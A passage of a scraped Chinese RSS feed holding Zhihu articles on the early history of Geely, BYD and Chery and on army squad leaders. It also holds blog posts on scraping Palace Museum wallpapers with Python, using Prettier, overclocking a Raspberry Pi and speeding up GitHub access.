class=\"ztext-empty-paragraph\"><br></p>\n<p>干摩托车是他接近汽车的迂回之路。他在浙江临海经济技术开发区买了一块850亩的地，名义上是生产摩托车，可建成的是“吉利豪情汽车工业园”。他收购了四川德阳监狱一家汽车厂，那家厂只有客车生产资质。1998年8月8日，第一辆吉利轿车下线（那时不敢叫轿车），但只能在省内销售、上牌、行驶。2001年11月，吉利汽车终于登上汽车生产企业产品目录，成为中国首家获得轿车生产资质的民营企业。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-2ecc4c7b12e763fd02293b2daa136bb4_b.jpg\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"648\" class=\"origin_image zh-lightbox-thumb\" width=\"831\" data-original=\"https://pic1.zhimg.com/v2-2ecc4c7b12e763fd02293b2daa136bb4_r.jpg\"><figcaption>1998年8月8日，吉利首款豪情轿车下线</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>与吉利造车之路同样曲折的还有比亚迪和奇瑞。</p>\n<p>比亚迪的掌门人是王传福。他本有一份让人艳羡的工作：北京有色金属研究院301室副主任，26岁，当时全国最年轻的处长。次年他又成为研究院下设比格电池有限公司总经理，但两年后他辞职下海了。</p>\n<p>他带领20多人创立了比亚迪科技有限公司，生产笔记本电脑和手机用电池。到2010年，比亚迪排名镍镉电池全球第一，镍氢电池第二，锂电池第三，成为世界知名的“电池大王”。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-c04f41b6a2f0b7a15a58d92531c20bab_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1\" data-rawheight=\"1\" class=\"content_image\" width=\"1\"></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-96a0ca45df663729ea1cf193bb3c12eb_b.jpg\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"487\" class=\"origin_image zh-lightbox-thumb\" width=\"831\" data-original=\"https://pic4.zhimg.com/v2-96a0ca45df663729ea1cf193bb3c12eb_r.jpg\"><figcaption>比亚迪收购西安秦川汽车有限责任公司</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>他不满足。2003年1月23日，比亚迪收购了连年亏损的西安秦川汽车有限责任公司77％的股份，成为继吉利之后第二家民营轿车生产企业。如今，他又成了世界闻名的“电动汽车大王”。</p>\n<p>奇瑞跨进汽车业更经历了一波神操作。</p>\n<p>奇瑞原本是安徽省芜湖市政府的汽车项目。那时地方干汽车的积极性都很高，但由于无权批准轿车项目，所以奇瑞有个内部代号“951工程”（“九五”期间安徽省1号工程），对外公开的名称叫“安徽汽车零部件工业公司”。</p>\n<p>芜湖市政府挖来安徽老乡、一汽“十大杰出青年”尹同耀（现名尹同跃）。奇瑞于1997年3月在芜湖经济开发区动工，那年尹同耀35岁。1999年，奇瑞轿车下线，同吉利一样，只能在本省卖、本省开。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-8d5839c93b61a7752c2225285cbfacd1_b.jpg\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"499\" class=\"origin_image zh-lightbox-thumb\" width=\"831\" data-original=\"https://pic2.zhimg.com/v2-8d5839c93b61a7752c2225285cbfacd1_r.jpg\"><figcaption>1999年12月18日，首款奇瑞风云轿车下线</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>2000年底，在有关政府部门运作下，奇瑞与上汽签了一份合资协议。奇瑞将20%股权无偿划拨给上汽，成为上汽子公司。上汽对奇瑞不投资、不参与管理、不承担债务、不分红。4年后，双方友好分手，上汽又将20%股份无偿划归奇瑞，轿车生产资质也留在了奇瑞。</p>\n<p>当时还有几家军转民企业获得轿车或微型车生产资质：贵航云雀、哈飞汽车、昌河汽车、重庆长安、陕西秦川……，长城、中兴等一批民营企业也诞生在那个年代。</p>\n<h2><b>摸着石头过河 第一波跨界造车的经验小结</b></h2>\n<p>外资进入、民企加盟、引进消化吸收先进技术，使包括商用车在内的中国汽车行业迅速壮大起来，掌握了发动机、变速器等关键技术，装备了世界上最先进的生产流水线，形成了完整的零部件配套产业链。拉动了上游的钢铁、石油、化工、橡胶、玻璃产业。促进了下游的公共交通、客货运输、城市化建设、乡村居民出行。建成了世界最大的汽车市场、最长的国家公路网、最庞大的物流体系，出现了世界上最拥挤的节假日驾车出行场景。</p>\n<p>也种下了苦果。那就是未能兑现当初“以市场换技术”的设想。我们吃了亏。</p>\n<p>据说，当年桑塔纳轿车停产时，上汽曾恳请大众将桑塔纳轿车技术转让给自己，但德国人没有同意。最后上汽通过收购英国罗浮汽车，拿到罗浮汽车的发动机、变速器、底盘等技术，才有了自主品牌荣威、MG的诞生。</p>\n<p>同样的遭遇也发生在一汽、东风、北汽、广汽、长安、华晨这些合资中方企业身上，这些企业采取将派入合资企业的中方技术、管理干部轮岗回自主企业的办法，将外方的技术、工艺流程、管理经验移植到自主企业，取得了很好成效。民企也从合资企业挖了不少人。</p>\n<p>合资没能让中方的自主品牌强起来，这一弱势一直延续至今。倒是没有合资门路的比亚迪、长城、吉利、奇瑞们，依靠自力更生的精神闯出了一条自主品牌的成功之路。</p>\n<p>这里有历史的原因。</p>\n<p>当初的合资，我们一穷二白，没有资金、没有技术、没有经验，只能把最好的厂房、最好的设备、最好的干部、最好的工人投入进去，剩下的家底在很长时间内失去了造血和再生功能。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-5b5089543763760a398d10f4087435d8_b.jpg\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"577\" class=\"origin_image zh-lightbox-thumb\" width=\"831\" data-original=\"https://pic1.zhimg.com/v2-5b5089543763760a398d10f4087435d8_r.jpg\"><figcaption>1983年5月5日，北京市汽车工业总公司经理吴忠良，美国汽车公司董事长兼最高执行官铁伯特签署北京吉普汽车有限公司合资经营总合同及章程</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>摸着石头过河，那一代合资人进行了艰辛探索。也许我们应该知道那些企业家的名字：北京吉普第一任董事长吴忠良、上海大众第一任总经理方宏、神龙汽车第一任总经理宋祖慰、广州标致第一任总经理刘煜伟……</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2><b><i>更多内容，请关注同名公众号。</i></b></h2>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-dian-dong-qi-che-bai-ren-hui?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">电动汽车百人会</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/409081491?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"军营里，有一种老师叫「班长」，关于他们有哪些故事和话语让你记忆深刻？","date":"2021-09-10 06:48:24","description":"\n<p>今天是第37个教师节</p>\n<p>在军营也有一群“老师”</p>\n<p>他们是战友眼中的“顶梁柱”</p>\n<p>是素质过硬的教练员</p>\n<p>是倾心“传帮带”的引路人一批批有志青年成长为合格军人他们毫无保留倾囊相授他们有一个共同的名字<b>班  长！！！</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-8a3e1cd5eedac034c9cbc2b2c3e2cefd_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-8a3e1cd5eedac034c9cbc2b2c3e2cefd\" data-watermark-src=\"v2-6511347c0d68224566187420c816d472\" data-private-watermark-src=\"v2-8086a2998c2f0fa729b51575ec88daf6\"></p>\n<p>训练场上</p>\n<p>铁面无情的是他们</p>\n<p>只为打下良好基础</p>\n<p>平时只有多流汗</p>\n<p>战时才能少流血</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-27f187b439068e6b1d5cd5101fdd6573_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"630\" data-watermark=\"original\" data-original-src=\"v2-27f187b439068e6b1d5cd5101fdd6573\" data-watermark-src=\"v2-1a4bcba11589db9d50ed9b411036a161\" data-private-watermark-src=\"v2-338d8c8038ab05c123fd458aa1770798\"></p>\n<p><br></p>\n<p>生活中</p>\n<p>关怀备至也是他们因为他们懂得</p>\n<p>以心交心才能换得真心</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ef0ccd52960ce2a30706148e11c88dee_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"630\" data-rawheight=\"630\" data-watermark=\"original\" data-original-src=\"v2-ef0ccd52960ce2a30706148e11c88dee\" data-watermark-src=\"v2-0c636f8d519f2365c93ab94886ee770a\" data-private-watermark-src=\"v2-7e0ed323dd43c7784941dd7fa7c9e08e\"></p>\n<p>急难险重任务面前</p>\n<p>出色完成任务的更是他们</p>\n<p>因为他们明白<br></p>\n<p>干出样子是职责所在</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d127cc64a22009a1eb8c5cea61abbe53_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"630\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-d127cc64a22009a1eb8c5cea61abbe53\" data-watermark-src=\"v2-1a1a33ca0700540c70b0a5944baad566\" data-private-watermark-src=\"v2-c5837ad765004571da2603ffb0869cf7\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-81ef4dfe998e7dc32518d5e6925f9de9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"51\" data-rawheight=\"51\" data-watermark=\"original\" data-original-src=\"v2-81ef4dfe998e7dc32518d5e6925f9de9\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>真情①：知心</b></p>\n<p>一个班虽然人不算多，但也称得上是各有千秋！不过没关系，班长对每个人情况“如数家珍”，一个表情、一个动作、一声叹息，都会引起班长的注意，面对面谈心交流，专治各种“疑难杂症”。</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-ecf4b424d262b0dfa1ea9712eb59717a_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"667\" data-watermark=\"original\" data-original-src=\"v2-ecf4b424d262b0dfa1ea9712eb59717a\" data-watermark-src=\"v2-d777ddf979c9e26cde7e4c39464c7392\" data-private-watermark-src=\"v2-011be1a0bba1f7bfc95099d059e4434a\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-81ef4dfe998e7dc32518d5e6925f9de9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"51\" data-rawheight=\"51\" data-watermark=\"original\" data-original-src=\"v2-81ef4dfe998e7dc32518d5e6925f9de9\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>真情②：暖心</b></p>\n<p>不论是冰冻三尺还是骄阳似火，班长的关心总能直抵内心。想家时一句安慰、生日时一声祝福、成功时一个肯定，让你感到身边有个精心照顾你的暖心大哥。</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-0771c159ec2a32a71dbf817b626c58e0_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"667\" data-watermark=\"original\" data-original-src=\"v2-0771c159ec2a32a71dbf817b626c58e0\" data-watermark-src=\"v2-2e9110082a5f7d8857f2268b43c782d8\" data-private-watermark-src=\"v2-8db38f5dbc32f18941d2fbcc067c3d27\"></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-81ef4dfe998e7dc32518d5e6925f9de9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"51\" data-rawheight=\"51\" data-watermark=\"original\" data-original-src=\"v2-81ef4dfe998e7dc32518d5e6925f9de9\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>真情③：信心</b></p>\n<p>筋疲力尽没动力？任务陌生有畏难？卫生打扫怕脏累？学习劲头不够足？只要有需要，班长总能在身边！一句“跟我来！看我的！有我在！”立马让你找回状态、信心百倍！<br></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-910731ca5c705d3bca410a90249bf754_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"667\" data-watermark=\"original\" data-original-src=\"v2-910731ca5c705d3bca410a90249bf754\" data-watermark-src=\"v2-a72f75c2fb47b43885ac74110bfa40be\" data-private-watermark-src=\"v2-06f0c9e3005c9fd7baf035084e3d6be8\"></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-81ef4dfe998e7dc32518d5e6925f9de9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"51\" data-rawheight=\"51\" data-watermark=\"original\" data-original-src=\"v2-81ef4dfe998e7dc32518d5e6925f9de9\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>真情④：耐心</b>、</p>\n<p>军人的成长是破茧成蝶的过程，磨砺中退掉所有青涩和稚嫩。在军旅之路，总有班长伴我们左右，化身为指路明灯，不论进步快或慢，都耐心指引我们向更高的山去冲锋。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6608086cf2605109207098b5733a1e45_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"667\" data-watermark=\"original\" data-original-src=\"v2-6608086cf2605109207098b5733a1e45\" data-watermark-src=\"v2-da8d4e353b88bcafea9ec9d427d82be4\" data-private-watermark-src=\"v2-91096068b55bb3a2076d012d92ed74c2\"></p>\n<p><br></p>\n<p><b>一声班长，一生班长</b></p>\n<p><b>军营有你，未来可期军旅路上</b></p>\n<p><b>都有一个前行的背影今天我们向班长致敬</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-bu-zhan-qu-57?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中部号角</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/485594623/answer/2113250381?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">27 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/23001321?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">在部队如何当好班长 ?</a><br><a href=\"http://www.zhihu.com/question/35520013?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">在部队，大家都经历过哪些有意思的班长？</a><br>\n","link":"http://www.zhihu.com/question/485594623/answer/2113250381?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 